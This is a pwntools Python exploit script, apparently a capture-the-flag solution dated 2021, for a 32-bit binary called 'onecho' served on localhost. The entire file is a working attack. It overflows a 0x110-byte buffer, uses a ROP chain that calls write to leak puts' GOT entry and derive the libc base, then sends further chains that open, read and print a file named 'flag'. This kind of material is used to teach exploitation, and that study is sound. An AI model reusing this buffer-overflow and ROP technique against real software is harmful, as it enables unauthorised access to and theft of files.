# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './onecho'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc.so.6')
context.binary = binary
context.terminal = ['gnome-terminal','-x', 'bash','-c']
DEBUG = 0
if DEBUG:
    p = process(binary)
    # libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote("127.0.0.1",11452)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

bss = 0x804C008
bss_addr = 0x804d000

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
write_plt = elf.plt['write']
your_read = 0x080495C6
pop3_ret = 0x08049811

payload = flat(
   'flag\x00'.ljust(0x110 ,'\x00' ),
    pop3_ret , bss,
    0x18,0,
    write_plt ,your_read, 1,puts_got,0x4
)
#puts_plt,0x080495C6,puts_got,

# dbg('*0x08049644')
# dbg()
sla('name:' , payload)
# sla('name:' , 'a'*0x30)
puts_addr = l32()

libc.address = puts_addr - libc.sym['puts']

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
ret = libc.search(asm(' ret')).next()
pop_ebp = 0x08049813


# dbg('*0x08049644')

flag_addr = bss

payload = flat(
    'flag\x00'.ljust( 0x110,'\x00'), 
    pop3_ret , bss,
    1,'flag',
    open_addr ,your_read ,flag_addr 
)

# open_addr ,read_addr ,puts_addr ,flag_addr,flag_addr ,0 , 3, flag_addr, 0x50 , flag_addr

sl( payload )

payload = flat(
    'flag\x00'.ljust( 0x110,'\x00'), 
    pop3_ret , bss,
    1,'flag',
    read_addr ,your_read ,3 , flag_addr , 0x30 
)

# dbg('*0x08049644')
sl( payload )

payload = flat(
    'flag\x00'.ljust( 0x110,'\x00'), 
    pop3_ret , bss,
    1,'flag',
    puts_addr ,your_read , flag_addr 
)

sl( payload )

p.interactive()

'''
@File    :   onecho.py
@Time    :   2021/10/08 11:12:44
@Author  :   Niyah 
'''